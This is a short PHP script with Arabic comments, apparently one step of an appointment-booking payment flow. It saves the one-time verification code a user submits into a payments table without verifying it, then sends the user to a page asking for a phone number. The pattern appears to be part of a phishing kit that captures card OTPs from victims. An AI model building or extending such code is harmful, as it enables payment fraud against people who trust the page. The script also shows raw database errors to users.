<?php
session_start();
require_once 'db.php';  // الاتصال بقاعدة البيانات

// التحقق من وجود معرف الحجز
$appointment_id = $_SESSION['appointment_id'] ?? null;
if (!$appointment_id) {
    die("معرف الحجز غير موجود.");
}

// التحقق من إرسال الطلب بشكل صحيح
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $otp_code = trim($_POST['otp_code']);

    if (empty($otp_code)) {
        die("رمز التحقق مطلوب.");
    }

    // تحديث حقل otp_code في جدول الدفع
    $stmt = $conn->prepare("UPDATE payments SET otp_code = ? WHERE appointment_id = ?");
    $stmt->bind_param("si", $otp_code, $appointment_id);

    if ($stmt->execute()) {
        // التوجيه إلى صفحة إدخال رقم الجوال
        header("Location: phone.php");
        exit;
    } else {
        die("فشل في حفظ رمز التحقق: " . $conn->error);
    }
} else {
    die("طلب غير صالح.");
}
?>
